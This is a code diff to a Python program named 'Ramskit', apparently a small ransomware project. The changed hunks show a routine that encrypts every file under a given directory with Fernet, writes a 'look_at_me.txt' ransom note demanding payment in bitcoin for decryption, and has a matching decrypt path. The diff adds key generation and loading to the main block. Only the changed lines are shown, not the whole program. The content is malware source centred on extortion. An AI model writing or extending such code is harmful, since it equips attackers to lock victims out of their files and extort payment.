@@ -36,7 +36,7 @@ class Ramskit:
             self.key = key
         print(f"[x] Key is {self.key}")
 
-    def encrypt_file(self, items):
+    def encrypt_file(self, items, key):
         f = Fernet(self.key)
         for item in items:
             with open(item, 'rb') as file:
@@ -48,7 +48,7 @@ class Ramskit:
             with open(item, 'wb') as file:
                 file.write(encrypted)
 
-    def decrypt_file(self, items):
+    def decrypt_file(self, items, key):
         f = Fernet(self.key)
         for item in items:
             with open(item, 'rb') as file:
@@ -100,6 +100,10 @@ if __name__ == '__main__':
     path = args.path
 
     ramskit = Ramskit()
+
+    ramskit.generate_key()
+    key = ramskit.load_key()
+
     items: [str] = list(Ramskit.flatten(Ramskit.expand_dir(path)))
     lam = os.path.join(path, 'look_at_me.txt')
 
@@ -110,14 +114,14 @@ if __name__ == '__main__':
                 You need to email me so I can give u my BTC wallet for the
                 decrypt's purchase lololololol \n\n
             ''')
-        ramskit.encrypt_file(items)
+        ramskit.encrypt_file(items, key)
     elif action == 'decrypt':
         if not os.path.exists(lam):
             print('No look_at_me.txt file found. Exiting...')
             sys.exit(1)
         os.remove(lam)
         items.remove(lam)
-        ramskit.decrypt_file(items)
+        ramskit.decrypt_file(items, key)
     elif action == 'generate_key':
         print(Ramskit.generate_key())
     else:
